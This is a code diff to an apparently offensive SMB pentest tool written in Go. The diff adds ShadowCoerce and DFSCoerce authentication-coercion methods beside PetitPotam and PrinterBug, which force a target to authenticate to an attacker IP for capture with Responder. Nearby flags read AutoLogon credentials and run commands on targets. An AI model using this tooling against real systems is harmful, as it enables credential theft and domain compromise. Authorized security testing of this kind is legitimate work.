@@ -492,10 +492,14 @@ func runSMB(cmd *cobra.Command, args []string) {
 		}
 
 		if smbCoerceTo != "" {
-			label := "PetitPotam"
-			coerce := smbcoerce.PetitPotam
-			if strings.ToLower(smbCoerceMethod) == "printerbug" {
+			label, coerce := "PetitPotam", smbcoerce.PetitPotam
+			switch strings.ToLower(smbCoerceMethod) {
+			case "printerbug":
 				label, coerce = "PrinterBug", smbcoerce.PrinterBug
+			case "shadowcoerce":
+				label, coerce = "ShadowCoerce", smbcoerce.ShadowCoerce
+			case "dfscoerce":
+				label, coerce = "DFSCoerce", smbcoerce.DFSCoerce
 			}
 			result, err := coerce(session, smbCoerceTo)
 			if err != nil {
@@ -730,7 +734,7 @@ func init() {
 	smbCmd.Flags().BoolVar(&smbCheckAutoLogon, "check-autologon", false, "Read AutoLogon credentials from HKLM\\...\\Winlogon via MS-RRP (winreg)")
 	smbCmd.Flags().BoolVar(&smbEnumRPC, "enum-rpc", false, "Enumerate registered RPC endpoints via the endpoint mapper (EPM, port 135 via IPC$)")
 	smbCmd.Flags().StringVar(&smbCoerceTo, "coerce-to", "", "Trigger coercion: target authenticates to <attacker_ip> (capture with Responder)")
-	smbCmd.Flags().StringVar(&smbCoerceMethod, "coerce-method", "petitpotam", "Coercion method: petitpotam (MS-EFSR) or printerbug (MS-RPRN spooler)")
+	smbCmd.Flags().StringVar(&smbCoerceMethod, "coerce-method", "petitpotam", "Coercion method: petitpotam (MS-EFSR), printerbug (MS-RPRN), shadowcoerce (MS-FSRVP) or dfscoerce (MS-DFSNM)")
 	smbCmd.Flags().BoolVar(&smbZerologon, "zerologon", false, "Check for Zerologon (CVE-2020-1472) - detection only, does not reset the machine password")
 	smbCmd.Flags().BoolVar(&smbLSASettings, "lsa-settings", false, "Read LSA security settings: WDigest, RunAsPPL, LmCompatibilityLevel, null session restrictions")
 	smbCmd.Flags().StringVar(&smbExec, "exec", "", "Execute a command on the target (see --exec-method)")
